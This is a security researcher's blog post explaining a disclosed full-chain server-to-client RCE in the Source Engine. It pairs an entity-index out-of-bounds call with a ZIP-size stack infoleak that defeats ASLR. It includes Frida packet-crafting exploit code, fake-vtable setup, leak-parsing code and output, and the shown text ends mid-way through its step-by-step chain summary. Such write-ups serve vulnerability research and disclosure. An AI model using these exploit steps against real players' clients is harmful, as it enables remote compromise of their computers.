---
layout:     post
title:      Exploiting the Source Engine (Part 2) - Full-Chain Client RCE in Source using Frida
date:       2021-05-01
summary: Exploiting a clientside RCE using a two-step bug chain utilizing Frida.RE
categories: source-engine exploitation
typora-copy-images-to: ../assets
typora-root-url: ../../gbps.github.io
---

## Introduction

Hey guys, it's been awhile. I have cool new information to share now that my bug bounty has finally gone through. This recent report contained a full server-to-client RCE chain which I'm proud of. Unlike my first submission, it links together two separate bugs to achieve code execution, one memory corruption and one infoleak, and was exploitable in all Source Engine 1 titles including TF2, CS:GO, L4D:2 (no game specific functionality required!). In this bug hunting adventure, I wanted to spice things up a bit, so I added some extra constraints to the bugs I found/used, as well as experimented using the [Frida](https://frida.re/) framework as a way to interface with the engine through Typescript. 

## Problems with SourceMod (since the last post)

If you read my last blog post, you knew that I was using [SourceMod](https://www.sourcemod.net/) as a way to script up my local dedicated server to test bugs I found for validity. While auditing this time around, it was quickly apparent that most of the obvious bugs in any of the original Source 2013 codebases were patched already. But, without confirming the bugs as fixed myself, I couldn't rule out their validity, so a lot of my initial time was just spent scripting up SourceMod scripts and testing. While SourceMod itself already has a pretty fleshed-out scripting environment, it still used the SourcePawn language, which is a bit outdated compared to modern scripting languages. In addition, adding any functionality that wasn't already in SourceMod required you to compile C++ plugins using their plugin API, which was sometimes tedious to work with. While SourceMod was very functional overall, I wanted to find something better. That's why I decided to try out [Frida](https://frida.re/) after hearing good things from friends who worked in the mobile space.

## Frida? On Windows?

One of the goals of this bug hunt was to try out Frida for testing PoCs and productizing the exploit. You might have heard about the Frida project before in the mobile hacking community where it really shines, but you might not have heard about it being used for exploiting desktop applications, especially on Windows! (did you know Frida fully supports Windows?) 

Getting started with Frida was actually quite simple, because the architecture is simple. In Frida, you have a "client" and a "server". The "client" (typically Python) selects a process to inject into, in this case hl2.exe, and injects the "server" (known as a Gadget) that will talk back and forth with the "client". The "server", executing inside the game, creates a rich Javascript environment with special bindings to read/write memory and hook code. To know more about how this works, check out the [Frida Docs](https://frida.re/docs/home/).

After getting that simple client and server set up for Frida, I created a [Typescript](https://github.com/oleavr/frida-agent-example) library which allowed me to interface with the Source Engine more easily. Those familiar with game engines know that very often the engine objects take advantage of C++ polymorphism which expose their functionality through virtual functions. So, in order to work with these objects from Frida, I had to write some vtable wrapper helpers that allowed me to convert native pointer values into actual Typescript objects to call functions on.

An example of what these wrappers look like:

```tsx
// Create a pointer to the IVEngineClient interface by calling CreateInterface exported by engine.dll
let client = IVEngineClient.CreateInterface()
log(`IVEngineClient: ${client.pointer}`)

// Call the vtable function to get the local client's net channel instance
let netchan = client.GetNetChannelInfo() as CNetChan
if (netchan.pointer.isNull()) {
    log(`Couldn't get NetChan.`)
    return;
}
```

Pretty slick! These wrappers helped me script up low-level C++ functionality with a handy little scripting interface.

The best part of Frida is really its hooking interface, [Interceptor](https://frida.re/docs/javascript-api/#interceptor). You can hook native functions directly from within Frida, and it handles the entire process of running the Typescript hooks and marshalling arguments to and from the JS engine. This is the primary way you use Frida to introspect, and it worked great for hooking parts of the engine just to see the values of arguments and return values while executing normally.

I quickly learned that the Source engine tooling I had made could also be injected into both a client (hl2.exe) and a server (srcds.exe) at the same time, without any real modification. Therefore, I could write a single PoC that instrumented both the client and server to prove the bug. The server would generate and send some network packets and the client would be hooked to see how it accepted the input. This dual-scripting environment allowed me to instrument practically all of the logic and communication I needed to ensure the prospective bugs I discovered were fully functional and unpatched.

Lastly, I decided to create a fairly novel Frida extension module that utilized the [ret-sync](https://github.com/bootleg/ret-sync) project to communicate with a loaded copy of IDA at runtime. What this let me do is assign names to functions inside of my IDA database and have Frida reach out through the ret-sync protocol to my IDA instance and request the location of certain functions by name. The intent was to make the exploit scripts much more stable between game binary updates (which happen every few days for games like CS:GO). 

Here's an example of hooking a function by IDA symbol using my ret-sync extension. The script dynamically asks my IDA instance where `CGameClient::ProcessSignonStateMsg` exists inside `engine.dll` the current process, hooks it, and then does some functionality with some engine objects:

```tsx
// Hook when new clients are connecting and wait for them to spawn in to begin exploiting them. This function is called every time a client transitions from one state to the next while loading into the server.
let signonstate_fn = se.util.require_symbol("CGameClient::ProcessSignonStateMsg")
Interceptor.attach(signonstate_fn, {
    onEnter(args) {
        console.log("Signon state: " + args[0].toInt32())

        // Check to make sure they're fully spawned in
        let stateNumber = args[0].toInt32()
        if (stateNumber != SIGNONSTATE_FULL) { return; }

        // Give their client a bit of time to load in, if it's slow.
        Thread.sleep(1)

        // Get the CGameClient instance, then get their netchannel
        let thisptr = (this.context as Ia32CpuContext).ecx;
        let asNetChan = new CGameClient(thisptr.add(0x4)).GetNetChannel() as CNetChan;
        if (asNetChan.pointer.isNull()) {
            console.log("[!] Could not get CNetChan for player!")
            return;
        }
        [...]
    }
})
```

Now, if the game updates, this script will still function so long as I have an IDA database for `engine.dll` open with `CGameClient::ProcessSignonStateMsg` named inside of it. The named symbols can be ported over between engine updates using [BinDiff](https://www.zynamics.com/bindiff.html) automagically, making it easy to automatically port offsets as the game updates! 

All in all, my experience with Frida was awesome and its extensibility was wonderful. I plan to use Frida for all sorts of exploitation and VR activities to follow, and will continue to use it with any more Source adventures in the foreseeable future. I encourage readers with backgrounds with pwntools and CTFing to consider trying out Frida against desktop binaries. I gained a lot from learning it, and I feel like the desktop reversing/VR/exploitation community should really look to adopt it as much as the mobile community has!

## Okay, enough about Frida. Talk about Source bugs!

There's a lot of bugs in Source. It's a very buggy engine. But not all bugs are made equal, and only some bugs are worth attempting to chain together. The easy type of bug to exploit in the engine is the basic stack-based buffer overflow. If you read my last blog post, you saw that Source typically compiles without any stack protections against buffer overflows. Therefore, it's trivial to gain control of the instruction pointer and begin ROP-ing for as long as you have a silly string bug affecting the stack. 

In CS:GO, the classic method of exploiting these type of bugs is to exploit some buffer overflow, build a ROP using the module `xinput.dll` which has ASLR marked as disabled, and execute shellcode on that alone. In Windows, DLLs can essentially mark themselves as not being subject to ASLR. Typically you will only find these on DLLs compiled with ancient versions of the MSVC compiler toolchain, which I believe is the case with `xinput.dll`. This doesn't mean that the module cannot be relocated to a new address. In fact, `xinput.dll` can actually be relocated to other addresses just fine, and sometimes can be found at different addresses depending on if another module's load conflicts with the address `xinput.dll` asks to be loaded at. Basically this means that, due to the way `xinput.dll` *asks* to be loaded, the system will choose not to randomize its base address, making it inherently defeat ASLR as you always know generally where `xinput.dll` is going to be found in your victim's memory. You can write one static ROP chain and use it unmodified on every client you wish to exploit.

In addition, since `xinput.dll` is always loaded into the games which use it, it is by far the easiest form of ASLR defeat in the engine. Valve doesn't seem to concerned by this, as its been exploited over and over again over the years. Surprisingly though, in TF2, there is no `xinput.dll` to utilize for ASLR defeat. This actually makes TF2, which runs on the older Source engine version, *significantly* harder to exploit than CS:GO, their flagship game, because TF2 requires a pointer leak to defeat ASLR. Not a great design choice I feel.

In the case of a `server->client` exploit, one of these exploits would typically look like:

- Client connects to server
- Server exploits stack-based buffer overflow in the client
- Bug overwrites the stack with a ROP chain written against `xinput` and overwrites into the instruction pointer (no stack cookie)
- Client begins executing gadgets inside of `xinput` to set up a call to `ShellExecuteA` or `VirtualAlloc/VirtualProtect`. 
- Client is running arbitrary code

If this reminds you of early 2000s era exploitation, you are correct. This is generally the level of difficulty one would find in entry level exploitation problems in CTF.

## What if my target doesn't have xinput.dll to defeat ASLR?

One would think: "Well, the engine is buggy already, that means that you can just find another infoleak bug and be done!" But it doesn't quite work that way in practice. As others who participate in the program have found, finding an information leak is actually quite difficult. This is just due to the general architecture of the networking of the engine, which rarely relies on any kind of buffer copy operations. Packets in the engine are very small and don't often have length values that are controlled by the other side of the connection. In addition, most larger buffers are allocated on the heap instead of the stack. Source uses a custom heap allocator, as most game engines do, and all heap allocations are implicitly zeroed before being given back to the caller, unlike your typical system `malloc` implementation. Any uninitialized heap memory is unfortunately not a valid target for an infoleak. 

An option to getting around this information leak constraint is to focus on finding bugs which allow you to leverage the corruption itself to leak information. This is generally the path I would suggest for anyone looking to exploit the engine in games without `xinput.dll`, as finding the typical vanilla infoleak is much more difficult than finding good corruption and exploiting that alone to leak information.

 Types of bugs that tend to be good for this kind of "all-in-one" corruption are:

- Arbitrary *relative* pointer writes to pointers in global queryable objects
- Heap overflows against a queryable object to cause controllable pointer writes
- Use-after-free with a queryable object

Heap exploits are cool to write, but often their stability can be difficult to achieve due to the vast number of heap allocations happening at any given time. This makes carving out areas of heap memory for your exploit require careful consideration for specifically sized holes of memory and the timing at which these holes are made. This process is lovingly referred to as [Heap Feng Shui](https://en.wikipedia.org/wiki/Heap_feng_shui). In this post, I do not go over how to exploit heap vulnerabilities on the Source engine, but I will note that, due to its custom allocator, the allocations are much more predictable than the default Windows 10 heap, which is a nice benefit for those looking to do heap corruption.

Also, notice the word *queryable* above. This means that, whatever you corrupt for your information leak, you need to ensure that it can be queried over the network. Very few types of game objects can be queried arbitrarily. The best type of queryable object to work with in Source is the `ConVar` object, which represents a configurable console variable. Both the client and server can send requests to query the value of any `ConVar` object. The string that is sent back is the value of either the integer value of the `CVar`, or an arbitrary-length string value.

## Bug Hunting - Struggling is fun!

This time around, I gave myself a few constraints to make the exploit process a bit more challenging, and therefore more fun:

- The exploit must be memory corruption and must not be a trivial stack-based buffer overflow
- The exploit must produce its own pointer leak, or chain another bug to infoleak
- The exploit must work in all Source 1 games (TF2, CS:GO, L4D:2, etc.) and not require any special configuration of the client
- The exploit must have a ~100% stability rate
- The exploit must be written using Frida, and must be "one-click" automatically exploited on any client connected to the server

Given these constraints, I ruled out quite a few bugs. Most of these were because they were trivial stack-based buffer overflows, or present in only one game but not the other.

Here's what I eventually settled on for my chain:

- **Memory Corruption** - An array index under/overflow that allowed for one-shot arbitrary execute of an address in the low-level networking code
- **Information Leak** - A stack-based information leak in file transfers that leveraged a "bug" in the ZIP file parser for the map file format (BSP)

I would say the general length of time to discover the memory corruption was about 1/10th of the time I spent finding the information leak. I spent around two months auditing code for information leaks, whereas the memory corruption bug became quickly obvious within a few days of auditing the networking code.

## Memory Corruption - Arbitrary execute with CL_CopyExistingEntity

The vulnerability I used for memory corruption was the array index over/under-flow in the low-level networking function `CL_CopyExistingEntity`. This is a function called within the packet handler for the server->client packet named `SVC_PacketEntities`. In Source, the way data about changes to game objects is communicated is through the "delta" system. The server calculates what values have changed about an entity between two points in time and sends that information to your client in the form of a "delta". This function is responsible for copying any changed variables of an existing game object from the network packet received from the server into the values stored on the client. I would consider this a very core part of the Source networking, which means that it exists across the board for all Source games. I have not verified it exists in older GoldSrc games, but I would not be surprised, considering this code and vulnerability are ancient and have existed for 15+ years untouched.

The function looks like so:

```cpp
void CL_CopyExistingEntity( CEntityReadInfo &u )
{
    int start_bit = u.m_pBuf->GetNumBitsRead();

    IClientNetworkable *pEnt = entitylist->GetClientNetworkable( u.m_nNewEntity );
    if ( !pEnt )
    {
        Host_Error( "CL_CopyExistingEntity: missing client entity %d.\n", u.m_nNewEntity );
        return;
    }

    Assert( u.m_pFrom->transmit_entity.Get(u.m_nNewEntity) );

    // Read raw data from the network stream
    pEnt->PreDataUpdate( DATA_UPDATE_DATATABLE_CHANGED );
```

`u.m_nNewEntity` is controlled arbitrarily by the network packet, therefore this first argument to `GetClientNetworkable` can be an arbitrary 32-bit value. Now let's look at `GetClientNetworkable`:

```cpp
IClientNetworkable* CClientEntityList::GetClientNetworkable( int entnum )
{
	Assert( entnum >= 0 );
	Assert( entnum < MAX_EDICTS );
	return m_EntityCacheInfo[entnum].m_pNetworkable;
}
```

As we see here, these `Assert` statements would typically check to make sure that this value is sane, and crash the game if they weren't. But, this is not what happens in practice. In release builds of the game, all `Assert` statements are not compiled into the game. This is for performance reasons, as the #1 goal of any game engine programmer is speed first, everything else second. 

Anyway, these `Assert` statements do not prevent us from controlling `entnum` arbitrarily. `m_EntityCacheInfo` exists inside of a globally defined structure `entitylist` inside of `client.dll`. This object holds the client's central store of all data related to game entities. This means that `m_EntityCacheInfo` since is at a static global offset, this allows us to calculate the proper values of `entnum` for our exploit easily by locating the offset of `m_EntityCacheInfo` in any given version of `client.dll` and calculating a proper value of `entnum` to create our target pointer.

Here is what an object inside of `m_EntityCacheInfo` looks like:

```cpp
// Cached info for networked entities.
// NOTE: Changing this changes the interface between engine & client
struct EntityCacheInfo_t
{
	// Cached off because GetClientNetworkable is called a *lot*
	IClientNetworkable *m_pNetworkable;
	unsigned short m_BaseEntitiesIndex;	// Index into m_BaseEntities (or m_BaseEntities.InvalidIndex() if none).
	unsigned short m_bDormant;	// cached dormant state - this is only a bit
};
```

All together, this vulnerability allows us to return an arbitrary `IClientNetworkable*` from `GetClientNetworkable` as long as it is aligned to an `8` byte boundary (as `sizeof(m_EntityCacheInfo) == 8`). This is important for finding future exploit chaining.

Lastly, the result of returning an arbitrary `IClientNetworkable*` is that there is immediately this function call on our controlled `pEnt` pointer:

```cpp
pEnt->PreDataUpdate( DATA_UPDATE_DATATABLE_CHANGED );
```

This is a virtual function call. This means that the generated code will offset into `pEnt`'s vtable and call a function. This looks like so in IDA:
{:refdef: style="text-align: center;"}
![image-20200507164606006](/assets/image-20200507164606006.png)
{: refdef}
Notice `call dword ptr [eax+24]`. This implies that the vtable index is at `24 / 4 = 6`, which is also important to know for future exploitation.

And that's it, we have our first bug. This will allow us to control, within reason, the location of a *fake object* in the client to later craft into an arbitrary execute. But how are we going to create a fake object at a known location such that we can convince `CL_CopyExistingEntity` to call the address of our choose? Well, we can take advantage of the fact that the server can set any arbitrary value to a `ConVar` on a client, and most `ConVar` objects exist in globals defined inside of `client.dll`.

The definition of ConVar is:

```cpp
class ConVar : public ConCommandBase, public IConVar
```

Where the general structure of a `ConVar` looks like:

```cpp
ConCommandBase *m_pNext; [0x00]
bool m_bRegistered; [0x04]
const cha *m_pszName; [0x08]
const char *m_pszHelpString; [0x0C]
int m_nFlags; [0x10]
ConVar *m_pParent; [0x14]
const char *m_pszDefaultValue; [0x18]
char *m_pszString; [0x1C]
```

In this bug, we're targeting `m_pszString` so that our crafted pointer lands directly on `m_pszString`. When the bug calls our function, it will believe that `&m_pszString` is the location of the object's pointer, and `m_pszString` will contain its vtable pointer. The engine will now believe that any value inside of `m_pszString` for the ConVar will be part of the object's structure. Then, it will call a function pointer at `*((*m_pszString)+0x1C)`. As long as the `ConVar` on the client is marked as `FCVAR_REPLICATED`, the server can set its value arbitrarily, giving us full control over the contents of `m_pszString`. If we point the vtable pointer to the right place, this will give us control over the instruction pointer!

`m_pszString` is at offset `0x1C` in the above `ConVar` structure, but the terms of our vulnerability requires that this pointer be aligned to an `8` byte boundary. Therefore, we need to find a suitable candidate `ConVar` that is both globally defined and replicated so that we can align `m_pszString` to correctly to return it to `GetClientNetworkable`. 

This can be seen by what `GetClientNetworkable` looks like in x64dbg:
{:refdef: style="text-align: center;"}
![image-20200507170851575](/assets/image-20200507170851575.png)
{: refdef}
In the above, the pointer we can return is controlled as such:

```
ecx+eax*8+28 where ecx is entitylist, eax is controlled by us
```

With a bit of searching, I found that the ConVar `sv_mumble_positionalaudio` exists in `client.dll` and is replicated. Here it exists at `0x10C6B788` in `client.dll`:
{:refdef: style="text-align: center;"}
![image-20200507173708203](/assets/image-20200507173708203.png)
{: refdef}
This means to calculate the value of `m_pszString`, we add `0x1A` to get `0x10C6B788 + 0x1C = 0x10C6b7A4`. In this build, `entitylist` is at an aligned offset of `4` (`0xC580B4`). So, now we can calculate if this candidate is aligned properly:

```
>>> 0x10c6b7a4 % 0x8
4
```

This might look wrong, but `entitylist` is actually aligned to a `0x04` boundary, so that will add an extra `0x04` to the above alignment, making this value successfully align to `0x08`!

Now we're good to go ahead and use the `m_pszString` value of `sv_mumble_positionalaudio` to fake our object's vtable *pointer* by using the server to control the string data contents through ConVar replication.

In summary, this is the path the code above will take:

- Call `GetClientNetworkable` to get `pEnt`, which we will fake to point to `&m_pszString`.
- The code dereferences the first value inside of `m_pszString` to get the pointer to the vtable
- The code offsets the vtable to index 6 and calls the first function there. We need to make sure we point this to a place we control, otherwise we would only be controlling the *vtable pointer* and not the actual *function address in the table*.

But where are we going to point the vtable? Well, we don't need much, just a location of a known place the server can control so we can write an address we want to execute. I did some searching and came across this:

```cpp
bool NET_Tick::ReadFromBuffer( bf_read &buffer )
{
	VPROF( "NET_Tick::ReadFromBuffer" );

	m_nTick = buffer.ReadLong();
#if PROTOCOL_VERSION > 10
	m_flHostFrameTime = (float)buffer.ReadUBitLong( 16 ) / NET_TICK_SCALEUP;
	m_flHostFrameTimeStdDeviation = (float)buffer.ReadUBitLong( 16 ) / NET_TICK_SCALEUP;
#endif
	return !buffer.IsOverflowed();
}
```

As you might see, `m_nTick` is controlled by the contents of the `NET_Tick` packet directly. This means we can assign this to an arbitrary 32-bit value. It just so happens that this value is stored at a global as well! After some scripting up in Frida, I confirmed that this is indeed completely controllable by the `NET_Tick` packet from the server:
{:refdef: style="text-align: center;"}
![image-20200513141444074](/assets/image-20200513141444074.png)
{: refdef}
The code to send this packet with my Frida bindings is quite simple too:

```tsx
function SetClientTick(bf: bf_write, value: NativePointer) {
    bf.WriteUBitLong(net_Tick, NETMSG_BITS)

    // Tick count (Stored in m_ClientGlobalVariables->tickcount)
    bf.WriteLong(value.toInt32())

    // Write m_flHostFrameTime -> 1
    bf.WriteUBitLong(1, 16);

    // Write m_flHostFrameTimeStdDeviation -> 1
    bf.WriteUBitLong(1, 16);
}
```

Now we have a candidate location to point our vtable pointer. We just have to point it at `&tickcount - 24` and the engine will believe that `tickcount` is the function that should be called in the vtable. After a bit of testing, here's the resulting script which creates and sends the `SVC_PacketEntities` packet to the client to trigger the exploit:

```tsx
// craft the netmessage for the PacketEntities exploit
function SendExploit_PacketEntities(bf: bf_write, offset: number) {
    bf.WriteUBitLong(svc_PacketEntities, NETMSG_BITS)

    // Max entries
    bf.WriteUBitLong(0, 11)

    // Is Delta?
    bf.WriteBit(0)

    // Baseline?
    bf.WriteBit(0)

    // # of updated entries?
    bf.WriteUBitLong(1, 11)

    // Length of update packet?
    bf.WriteUBitLong(55, 20)

    // Update baseline?
    bf.WriteBit(0)

    // Data_in after here
    bf.WriteUBitLong(3, 2) // our data_in is of type 32-bit integer

    // >>>>>>>>>>>>>>>>>>>> The out of bounds type confusion is here <<<<<<<<<<<<<<<<<<<<
    bf.WriteUBitLong(offset, 32)

    // enterpvs flag
    bf.WriteBit(0)

    // zero for the rest of the packet
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
}
```

Now we've got the following modified chain:

- Call `GetClientNetworkable` to get `pEnt`, which we will fake to point to `&m_pszString`.
- The code dereferences the first value inside of `m_pszString` to get the pointer to the vtable. We point this at `&tickcount - 6*4` which we control.
- The code offsets the vtable to index 6, dereferences, and calls the "function", which will be the value we put in `tickcount`. 

This generally looks like this in the exploit script:

```tsx
// The fake object pointer and the ROP chain are stored in this cvar
ReplicateCVar(pkts_to_send, "sv_mumble_positionalaudio", tickCountAddress)

// Set a known location inside of engine.dll so we can use it to point our vtable value to
SetClientTick(pkts_to_send, new NativePointer(0x41414141))

// Then use exploit in PacketEntities to fake the object pointer to point to sv_mumble_positionalaudio's string value
SendExploit_PacketEntities(pkts_to_send, 0x26DA) 
```

`0x26DA` was calculated above to be the necessary `entnum` value to cause the out-of-bounds and align us to `sv_mumble_positionalaudio->m_pszString`.

Finally, we can see the results of our efforts:
{:refdef: style="text-align: center;"}
![image-20200513142919977](/assets/image-20200513142919977.png)
{: refdef}
As we can see here, `0x41414141` is being popped off the stack at the `ret`, giving us a one-shot arbitrary execute! What you can't see here is that, further down on the stack, our entire packet is sitting there unchanged, giving us ample room for a ROP chain.

Now, all we need is a pivot, which can be easily found using the [Ropper](https://github.com/sashs/Ropper) project. After finding an appropriate pivot, we now can begin crafting a ROP chain... except we are missing something important. We don't know where any gadgets are located in memory, including our stack pivot! Up until now, everything we've done is with relative offsets, but now we don't even know where to point the value of `0x41414141` to on the client, because the layout of the code is randomized by ASLR. The easy way out would be to load up CS:GO and use `xinput.dll` addresses for our ROP chain... but that would violate my arbitrary constraint that this exploit must work for *all* Source games.

This means we need to go infoleak hunting.

## Leaking uninitialized stack memory using a tricky ZIP file bug

After auditing the engine for many days over the course of a few months, I was finally able to engineer a series of tricks to chain together to cause the engine to leak uninitialized stack memory. This was all-in-all significantly harder than the memory corruption, and required a lot of out-of-the-box thinking to get it to work. This was my favorite part of the exploit. Here's some background on how some of these systems work inside the engine and how they can be chained together:

- Servers can cause the client to upload arbitrary files with certain file extensions
- Map files can contain an embedded ZIP file which can package additional textures/files. This is called a "pakfile".
- When the map has a pakfile, the engine adds the zip file as sort of a "virtual overlay" on the regular filesystem the game uses to read/write files. This means that, in any file accesses the game makes, it will check the map's pakfile to see if it can read it from there.

The interesting behavior I discovered about this system is that, if the server requests a file that is *inside of the map's pakfile*, the client will upload that file *from the embedded ZIP* to the server. This wouldn't make any sense in a normal case, but what it does is create a very unintended attack surface.

Now, let's take a look at the function which is responsible for determining how large the file is that is going to be uploaded to the server, and if it is too large to be sent:

```cpp
int totalBytes = g_pFileSystem->Size( filename, pPathID );

if ( totalBytes >= (net_maxfilesize.GetInt()*1024*1024) )
{
    ConMsg( "CreateFragmentsFromFile: '%s' size exceeds net_maxfilesize limit (%i MB).\n", filename, net_maxfilesize.GetInt() );
    return false;
}
```

So, what happens inside of `g_pFileSystem->Size` when you point it to a file inside the pakfile? Well, the code reads the ZIP file structure and locates the file, then reads the size directly from the ZIP header:
{:refdef: style="text-align: center;"}
![image-20200430014752750](/assets/image-20200430014752750.png)
{: refdef}
Notice: `lookup.m_nLength = zipFileHeader.uncompressedSize`

Now we fully control the contents of the map file we gave to the client when they loaded in. Therefore, we control all the contents of the embedded pakfile inside the map. This means we control the full 32-bit value returned by `g_pFileSystem->Size( filename, pPathID );`.

So, maybe you have noticed where we're going. `int totalBytes` is a signed integer, and the comparison for whether a file is too large is determined by a signed comparison. What happens when `totalBytes` is negative? That makes it fully pass the length check.

If we are able to hack a file into the ZIP structure with a negative length, the engine will now happily upload to the server.

Let's look at the function responsible for reading the file to be uploaded to the server. 

Inside of ``CNetChan::SendSubChannelData``:

```cpp
g_pFileSystem->Seek( data->file, offset, FILESYSTEM_SEEK_HEAD );
g_pFileSystem->Read( tmpbuf, length, data->file );
buf.WriteBytes( tmpbuf, length );
```

A stack buffer of size 0x100 is used to read contents of the file in 0x100 sized chunks as the file is sent to the server. It does so by calling `g_pFileSystem->Read()` on the file pointer and reading out the data to a temporary buffer on stack. The subchannel believes this file to be very large (as the subchannel interprets the size as an unsigned integer). The networking code will indefinitely send chunks to the server by allocating `0x100` of stack space and calling `->Read()`. But, when the file pointer reaches the end of the pakfile, the calls to `->Read()` stop writing out any data to the stack as there is no data left to read. Rather than failing out of this function, the return value of `->Read()` is ignored and the data is sent Anyway. Because the stack's contents are not cleared with each iteration, 0x100 bytes of uninitialized stack data are sent to the server constantly. The client's subchannel will continue to send fragments indefinitely as the "file size" is too large to ever be sent successfully.

After quite a bit of learning about how the PKZIP file structure works, I was able to write up this Python script which can take an existing BSP and hack in a negatively sized file into the pakfile. Here's the result:
{:refdef: style="text-align: center;"}
![image-20200506163703366](/assets/image-20200506163703366-1619886788574.png)
{: refdef}
Now, we can test it by loading up Frida and crafting a packet to request the hacked file be uploaded to the server from the pakfile. Then, we can enable `net_showfragments 1` in the game's console to see all of the fragments that are being sent to us:
{:refdef: style="text-align: center;"}
![image-20200506171807825](/assets/image-20200506171807825.png)
{: refdef}
This shows us that the client is sending many file fragments (`num = 1` means file fragment). When left running, it will not stop re-leaking that stack memory to us, and will just continue to do so infinitely as long as the client is connected. This happens slowly over time, so the client's game is unaffected.

I also placed a Frida Interceptor hook on the function responsible for reading the file's size, and here we can see that it is indeed returning a negative number:
{:refdef: style="text-align: center;"}
![image-20200506164957309](/assets/image-20200506164957309.png)
{: refdef}
Lastly, I hooked the function responsible for processing incoming file fragment packets on the server, and lo and behold, I have this blob of data being sent to us:

```
           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
00000000  50 4b 05 06 00 00 00 00 06 00 06 00 f0 01 00 00  PK..............
00000010  86 62 00 00 20 00 58 5a 50 31 20 30 00 00 00 00  .b.. .XZP1 0....
00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000030  00 00 00 00 00 00 fa 58 13 00 00 58 13 00 00 26  .......X...X...&
00000040  00 00 00 00 00 00 00 00 00 00 00 00 00 19 3b 00  ..............;.
00000050  00 6d 61 74 65 72 69 61 f0 5e 65 62 30 2e b9 05  .materia.^eb0...
00000060  60 55 65 62 9c 76 71 00 ce 92 61 62 f0 5e 65 62  `Ueb.vq...ab.^eb
00000070  08 0b b9 05 b8 00 7c 6d 30 2e b9 05 b9 00 7c 6d  ......|m0.....|m
00000080  f0 5e 65 62 f0 5e 65 62 f0 89 61 62 f0 5e 65 62  .^eb.^eb..ab.^eb
00000090  44 00 00 00 60 55 65 62 60 55 65 62 00 00 00 00  D...`Ueb`Ueb....
000000a0  00 b5 4e 00 00 6d 61 74 65 72 69 61 6c 73 2f 6d  ..N..materials/m
000000b0  61 70 73 2f 63 70 5f 63 ec 76 71 00 00 02 00 00  aps/cp_c.vq.....
000000c0  0a a4 bc 7b 30 2e b9 05 f0 70 88 68 40 00 00 00  ...{0....p.h@...
000000d0  00 a5 db 09 01 00 00 00 c4 dc 75 00 16 00 00 00  ..........u.....
000000e0  00 00 00 00 98 77 71 00 00 00 00 00 00 00 00 00  .....wq.........
000000f0  30 77 71 00 cb 27 b3 7b 00 03 00 00 97 27 b3 7b  0wq..'.{.....'.{
```

You might not be able to tell, but this data is uninitialized. Specifically, there are pointer values that begin with `0x7B` or `0x7C` littered in here:

- `97 27 b3 7b`
- `0a a4 bc 7b`
- `05 b9 00 7c`
- `05 b8 00 7c`

The offsets of these pointer values in the 0x100 byte buffer are not always at the same place. Some heuristics definitely go a long way here. A simple mapping of DWORD values inside the buffer over time can show that some values quickly look like pointers and some do not. After a bit of tinkering with this leak, I was able to get it controlled to leak a known pointer value with ~100% certainty.

Here's what the final output of the exploit looked like against a typical user:

```
[*] Intercepting ReadBytes (frag = 0)
0x0: 0x14b5041
0x4: 0x14001402
0x8: 0x0
0xc: 0x0
0x10: 0xd99e8b00
0x14: 0xffff00d3
0x18: 0xffff00ff
0x1c: 0x8ff
0x20: 0x0
0x24: 0x0
0x28: 0x18000
0x2c: 0x74000000
0x30: 0x2e747365
0x34: 0x50747874
0x38: 0x6054b
0x3c: 0x1000000
0x40: 0x36000100
0x44: 0x27000000
[...]
0xcc: 0xafdd68
0xd0: 0xa097d0c
0xd4: 0xa097d00
0xd8: 0xab780c
0xdc: 0x4
0xe0: 0xab7778
0xe4: 0x7ac9ab8d
0xe8: 0x0
0xec: 0x80
0xf0: 0xab7804
0xf4: 0xafdd68
0xf8: 0xab77d4
0xfc: 0x0
[*] leakedPointer: 0x7ac9ab8d
[*] Engine_Leak2 offset: 0x23ab8d
[*] leakedBase: 0x7aa60000
```

Only one of these values had a lower WORD offset that made sense (`0xE4`) therefore it was easily selectable from the list of DWORDS. After leaking this pointer, I traced it back in IDA to a return location for the upper stack frame of this function, which makes total sense. I gave it a label `Engine_Leak2` in IDA, which could be loaded directly from my ret-sync connection to dynamically calculate the proper base address of the `engine.dll` module:

```tsx
// calculate the engine base based on the RE'd address we know from the leak
static convertLeakToEngineBase(leakedPointer: NativePointer) {
    console.log("[*] leakedPointer: " + leakedPointer)

    // get the known offset of the leaked pointer in our engine.dll
    let knownOffset = se.util.require_offset("Engine_Leak2");
    console.log("[*] Engine_Leak2 offset: " + knownOffset)

    // use the offset to find the base of the client's engine.dll
    let leakedBase = leakedPointer.sub(knownOffset);
    console.log("[*] leakedBase: " + leakedBase)

    if ((leakedBase.toInt32() & 0xFFFF) !== 0) {
        console.log("[!] Failed leak...")
        return null;
    }

    console.log("[*] Got it!")
    return leakedBase;
}
```

## The Final Chain + RCE!

After successfully developing the infoleak, now we have both a pointer leak and an arbitrary execute bug. These two are sufficient enough for us to craft a ROP chain and pop that sweet sweet calculator. The nice part about Frida being a Python module at its core is that you can use [pyinstaller](https://www.pyinstaller.org/) to turn any Frida script into an all-in-one executable. That way, all you have to do is copy the .exe onto a server, run your Source dedicated server, and launch the `.exe` to arm the server for exploitation.

Anyway, here is the full step-by-step detail of chaining the two bugs together:

1. Player joins the exploitation server. This is picked up by the PoC script and it begins to exploit the client.

2. Player downloads the map file from the server. The map file is specially prepared to install `test.txt` into the `GAME` filesystem path with the compromised length

3. The server executes `RequestFile` to request the `test.txt` file from the pakfile. The client builds fragments for the new file and begins sending `0x100` sized fragments to the server, leaking stack contents. Inside the stack contents is a leaked stack frame return address from a previous call to `bf_read::ReadBytes`. By doing some calculations on the server, this achieves a full ASLR protection bypass on the client.

4. The malicious server calculates the base of `engine.dll` on the client instance using the leaked pointer. This allows the server to now build a pointer value in the exploit payload to anywhere within `engine.dll`. Without this infoleak bug, the payload could not be built because the attacker does not know the location of any module due to ASLR.

5. The server script builds a fake vtable pointer on the target client instance by replicating a ConVar onto the client. This is used to build a fake vtable on the client with a pointer to the fake vtable in a known location (the global ConVar). The PoC replicates the fake vtable onto `sv_mumble_positionalaudio` which is a replicated ConVar inside of `client.dll`. The location of the contents of this replicated ConVar can be calculated from `sv_mumble_positionalaudio->m_pszString` and is used for later exploitation steps.

